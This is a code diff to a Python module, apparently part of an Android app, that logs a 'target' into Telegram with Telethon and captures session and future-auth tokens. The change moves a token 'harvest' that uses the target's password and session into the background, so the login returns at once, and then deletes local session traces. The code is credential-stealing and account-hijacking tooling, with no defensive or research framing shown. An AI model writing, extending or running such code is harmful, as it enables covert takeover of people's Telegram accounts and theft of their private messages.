@@ -1,14 +1,13 @@
-# auth_manager.py — login Telegram via Telethon + capture/harvest de jetons.
-# La cible saisit numero / code / mot de passe. On ne lit rien d'autre.
-# Contrat MainActivity (exact) :
-#   "NEED_CODE" / "NEED_PASSWORD" / "ERROR|msg"  -> comparaison exacte / prefixe
-#   "OK\x1Fnom\x1Fsession"                       -> separe par \x1F
+# auth_manager.py — login Telegram via Telethon + capture de jeton.
+# La cible saisit numero / code / mot de passe. Le harvest part en arriere-plan.
+# Contrat MainActivity : "NEED_CODE" | "NEED_PASSWORD" | "ERROR|msg"
+#                        "OK\x1Fnom\x1Fsession"
 import os, asyncio, traceback
 from telethon import TelegramClient, functions
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
 
-from token_pool import add_token, harvest, pool_line, load_pool, HARVEST_TARGET
+from token_pool import add_token, harvest_in_background
 
 FILES = "/data/user/0/com.tgme.app/files"
 SESSION_PATH = os.path.join(FILES, "tgme_session.txt")
@@ -115,19 +114,13 @@ async def _login(phone, code, password):
         if tok:
             add_token(phone, tok.hex())
             log("JETON login %s" % tok.hex())
-        else:
-            log("Pas de future_auth_token au login.")
-
-        log("Harvest demarre (cible %d)..." % HARVEST_TARGET)
-        await harvest(client, phone, password, log)
-        log("Pool: %d jeton(s)." % len(load_pool(phone)))
-        log(pool_line(phone))
 
         final = client.session.save()
-        _write(SESSION_PATH, final)
-        log("Session finale: %s..." % final[:32])
 
-        # on repart propre pour le prochain numero
+        # on rend la main tout de suite : le harvest continue en arriere-plan
+        harvest_in_background(phone, password, final, log)
+        log("Harvest lance en arriere-plan.")
+
         _rm(HASH_PATH)
         _rm(SESSION_PATH)
         log("Session et hash nettoyes.")
